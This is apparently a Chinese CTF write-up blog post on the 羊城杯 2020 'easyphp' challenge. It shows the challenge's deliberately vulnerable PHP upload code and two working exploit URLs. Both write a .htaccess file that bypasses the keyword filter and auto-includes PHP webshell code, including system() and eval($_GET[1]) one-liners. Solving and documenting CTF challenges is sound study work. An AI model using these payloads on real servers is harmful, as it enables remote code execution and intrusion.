# 【羊城杯 2020】easyphp


# [羊城杯 2020]easyphp

## 思路
* 源码

  ```
   &lt;?php
      $files = scandir(&#39;./&#39;); 
      foreach($files as $file) {
          if(is_file($file)){
              if ($file !== &#34;index.php&#34;) {
                  unlink($file);
              }
          }
      }
      if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
          highlight_file(__FILE__);
          die();
      }
      $content = $_GET[&#39;content&#39;];
      if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
          echo &#34;Hacker&#34;;
          die();
      }
      $filename = $_GET[&#39;filename&#39;];
      if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) {
          echo &#34;Hacker&#34;;
          die();
      }
      $files = scandir(&#39;./&#39;); 
      foreach($files as $file) {
          if(is_file($file)){
              if ($file !== &#34;index.php&#34;) {
                  unlink($file);
              }
          }
      }
      file_put_contents($filename, $content . &#34;\nHello, world&#34;);
  ?&gt; 
  ```

  在目录下，**只有index.php能够作为php解析执行**

  可以写一个.htaccess让index.php自动包含执行代码来实现我们的恶意代码执行

  * 代码审计

    访问index.php时删除所有除了index.php的文件

    ```
    $files = scandir(&#39;./&#39;); 
      foreach($files as $file) { 
        if(is_file($file)){ 
          if ($file !== &#34;index.php&#34;) { 
            unlink($file); 
          } 
        } 
      } 
    ```

    对上传内容过滤，对文件名进行了过滤

    ```
     $content = $_GET[&#39;content&#39;]; 
      if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { 
        echo &#34;Hacker&#34;; 
        die(); 
      } 
    ```

* 思路一

  向`.htaccess`文件通过`#`写入shell，并且用`auto_prepend_file`包含`.htaccess`

  但是file关键字被ban了，可以用反斜杠绕过

  结尾要用`\`处理content中的`\n`，防止与后面的Hello word进行拼接时报错

  ```
  ?filename=.htaccess&amp;content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system(&#39;cat%20/fla?&#39;)%3B%3F%3E%5C
  ```

* 思路二

  &gt; 这个需要传参两次，相对上面一句话搞定麻烦一丢丢

  利用.htaccess文件特性，不过这次是通过设置php_value来设置preg_macth正则回溯次数

  先写入.htaccess，再直接通过php://filter伪协议写入一句话

  ```
  ?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename=.htaccess
  ```

  ```
  ?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;1=phpinfo();
  ```

## 总结
* 文件上传
* .htaccess利用

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020easyphp/  

